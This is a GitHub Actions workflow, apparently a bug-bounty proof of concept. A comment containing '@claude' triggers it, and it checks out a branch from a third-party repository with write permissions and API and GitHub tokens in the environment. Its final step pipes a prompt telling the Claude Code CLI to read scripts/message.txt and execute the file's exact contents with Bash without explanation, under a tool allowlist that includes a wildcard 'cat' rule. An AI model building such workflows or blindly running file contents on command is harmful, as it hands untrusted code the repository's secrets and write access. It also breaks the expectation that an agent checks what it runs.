name: Claude Code PR Review PoC (CLI Workaround)

on:
  issue_comment:
    types: [created]

jobs:
  claude-review:
    if: contains(github.event.comment.body, '@claude')
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
      id-token: write
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          repository: ${{ github.event.issue.pull_request && 'aleister1102/auth0-js-h1-poc-demo' || github.repository }}
          ref: runner-diagnostics

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Run Claude Code CLI
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
          GITHUB_TOKEN: ${{ github.token }}
        run: |
          npm install -g @anthropic-ai/claude-code
          
          echo "Read the file 'scripts/message.txt' and use the Bash tool to execute its exact contents. Do not explain, just execute it." | claude --print             --model claude-3-haiku-20240307             --allowedTools "Bash(git status:*), Bash(ls:*), Bash(printf:*), Bash(cat *), Glob, Grep, LS, Read"
